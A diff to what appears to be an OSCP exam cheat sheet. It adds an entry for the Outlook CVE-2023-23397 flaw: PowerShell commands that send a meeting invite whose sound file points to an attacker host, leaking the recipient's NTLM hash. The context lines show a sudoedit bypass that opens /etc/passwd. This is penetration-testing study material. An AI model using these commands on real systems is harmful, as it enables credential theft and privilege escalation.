@@ -159,6 +159,7 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [CVE-2022-30190: MS-MSDT Follina RCE](https://github.com/0xsyr0/OSCP#cve-2022-30190-ms-msdt-follina-rce)
 		- [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](https://github.com/0xsyr0/OSCP#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
 		- [CVE-2023-22809: Sudo Bypass](https://github.com/0xsyr0/OSCP#cve-2023-22809-sudo-bypass)
+		- [CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)](https://github.com/0xsyr0/OSCP#cve-2023-23397-microsoft-outlook-click-to-run-pe-0-day-powershell-implementation)
 		- [Juicy Potato LPE](https://github.com/0xsyr0/OSCP#juicy-potato-lpe)
 		- [SharpEfsPotato LPE](https://github.com/0xsyr0/OSCP#sharpefspotato-lpe)
 		- [Shocker Container Escape](https://github.com/0xsyr0/OSCP#shocker-container-escape)
@@ -4021,6 +4022,13 @@ EDITOR="vi -- /etc/passwd" sudoedit /etc/motd
 
 ```c
 sudoedit /etc/motd
+```
+
+#### CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)
+
+```c
+PS C:\> Import-Module .\CVE-2023-23397.ps1
+PS C:\> Send-CalendarNTLMLeak -recipient "<EMAIL>" -remotefilepath "\\<LHOST>\<FILE>.wav" -meetingsubject "<SUBJECT>" -meetingbody "<TEXT>"
 ```
 
 #### Juicy Potato LPE
